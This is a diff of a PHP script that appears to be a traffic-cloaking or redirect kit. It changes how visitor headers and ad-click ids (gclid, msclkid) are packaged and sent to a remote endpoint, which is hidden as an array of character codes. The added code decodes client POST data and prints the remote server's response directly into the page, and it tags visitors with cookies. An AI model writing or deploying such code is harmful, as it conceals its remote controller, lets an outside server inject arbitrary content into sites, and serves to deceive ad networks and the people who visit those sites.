@@ -26,80 +26,34 @@ function httpHandleResponse($response, $logToFile = true)
 	} else {
 		$currentURI = (!empty($_SERVER['HTTPS']) ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
 
-		file_put_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'16r3z9gvnyi0', $response);
+        file_put_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'16r3z9gvnyi0', $response);
 
-		if ( ! empty($decodedResponse[0]) && ($decodedResponse[0] != $currentURI)) {
-            if (!httpTaggedUser() && in_array($decodedResponse[6],[1,3])) {
-                httpTagUser($decodedResponse[6], $decodedResponse[4]);
-            }
-
-			header( "Location: " . $decodedResponse[0] );
-
-			if ($decodedResponse[5] == true) {
-				header('Content-Length: '.rand(1,128));
-				exit;
-			}
-
-			return true;
-		}
-
-        if (!httpTaggedUser() && in_array($decodedResponse[6],[2,3])) {
+        if (!httpTaggedUser() && ($decodedResponse[6] > 0)) {
             httpTagUser($decodedResponse[6], $decodedResponse[4]);
         }
 
-		return false;
+		if ($decodedResponse[0] != $currentURI) {
+			print($response);
+		}
 	}
 }
 
-function httpRequestMakePayload($campaignId, $campaignSignature)
+function httpRequestMakePayload($campaignId, $campaignSignature, array $postData)
 {
-    $payload = [];
-    array_push($payload, $campaignId, $campaignSignature);
-
-    $h = httpGetHeaders();
-
-    foreach ($h as $k => $v)
+    if (!array_key_exists('q', $postData))
     {
-        array_push($payload, $v);
+        return $postData;
     }
 
-    array_push($payload, 'f');
+    $postData = $postData['q'];
 
-    for ($i = 0; $i < 14; $i++)
-    {
-        array_push($payload, md5($campaignSignature.uniqid($campaignId)));
-    }
+    $payload = preg_split('@\|@',base64_decode($postData));
 
-    $getKeys = array_keys($_GET);
+    $payload[1] = $campaignSignature;
 
-    $gclid = 0;
+	$payload[28] = 'pisccl40';
+	$payload[29] = '0';
 
-    foreach($getKeys as $key)
-    {
-    	if (preg_match('@gclid|msclkid@i', $key))
-	    {
-	    	$gclid = $_GET[$key];
-	    }
-    }
-
-    $payload[] = $gclid;
-
-	for ( $i = 0; $i < 3; $i ++ )
-    {
-        array_push($payload, md5($campaignSignature . uniqid($campaignId)));
-    }
-
-	array_push( $payload, $campaignSignature );
-
-	for ( $i = 0; $i < 1; $i ++ ) {
-		array_push( $payload, md5( $campaignSignature . uniqid( $campaignId ) ) );
-	}
-
-	array_push($payload, 'pisccl40');
-
-	// Use LPR
-	array_push($payload, '0');
-	
     return base64_encode(implode('|',$payload));
 }
 
@@ -195,7 +149,8 @@ function httpGetAllHeaders()
 
 function httpRequestInitCall()
 {
-	$s = [104,116,116,112,115,58,47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111, 47, 100, 47 ];
+	$s = [104,116,116,112,115,58,47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111, 47, 101, 47 ];
+
     $u = '';
     foreach($s as $v) { $u .=chr($v); }
     $u .= '16r3z9gvnyi0';
@@ -267,6 +222,11 @@ function httpTagUser($type, $life)
     setcookie('16r3z9gvnyi0', $type, time() + $life * 60 * 60 * 24, '/');
 }
 
+function isPost()
+{
+    return $_SERVER['REQUEST_METHOD'] == 'POST' ? true : false;
+}
+
 function isPHPVersionAcceptable() {
 	if (PHP_MAJOR_VERSION == 5 && PHP_MINOR_VERSION < 4) {
 		return 'Please update your PHP Version to PHP 5.4 or higher to use this application.';
@@ -336,5 +296,4 @@ function logToFile($result)  {
 
 	return file_put_contents($filename, $contents, FILE_APPEND) ? true : false;
 }
-
 ?>
